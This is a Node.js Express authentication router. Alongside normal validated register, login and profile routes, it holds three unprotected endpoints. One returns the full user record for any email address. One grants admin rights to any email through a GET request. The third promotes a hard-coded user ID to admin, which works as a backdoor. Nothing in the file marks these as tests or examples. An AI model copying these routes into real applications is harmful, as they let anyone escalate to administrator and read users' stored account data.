const express=require("express");
const router=express.Router();
const {body}=require("express-validator");
const {register,login,getMe}=require("./auth.controller");
const {protect}=require("../../middlewares/auth.middleware");
const registerValidation=[
  body("name").trim().notEmpty().withMessage("Name is required"),
  body("email").isEmail().withMessage("Valid email is required"),
  body("password")
    .isLength({ min: 6 })
    .withMessage("Password must be at least 6 characters"),
];
const loginValidation=[
  body("email").isEmail().withMessage("Valid email is required"),
  body("password").notEmpty().withMessage("Password is required"),
];
router.post("/register", registerValidation, register);
router.post("/login", loginValidation, login);
router.get("/me", protect, getMe);
const User=require("../users/user.model");
router.get("/check-user/:email", async (req, res)=>{
  const user=await User.findOne({ email: req.params.email });
  res.json(user);
});
router.get("/make-admin/:email", async (req, res)=>{
  try{
    await User.collection.updateOne(
      { email: req.params.email },
      { $set: { role: "admin" } }
    );
    const user=await User.findOne({ email: req.params.email });
    res.json({ success: true, user });
  }catch(err){
    res.json({ error: err.message });
  }
});
router.get("/force-admin", async (req, res)=>{
  try{
    const result=await User.collection.updateOne(
      { _id: require("mongoose").Types.ObjectId.createFromHexString("69d252b1898ce29f2243626b") },
      { $set: { role: "admin" } }
    );
    const user=await User.findById("69d252b1898ce29f2243626b");
    res.json({ result, user });
  }catch(err){
    res.json({ error: err.message });
  }
});
module.exports=router;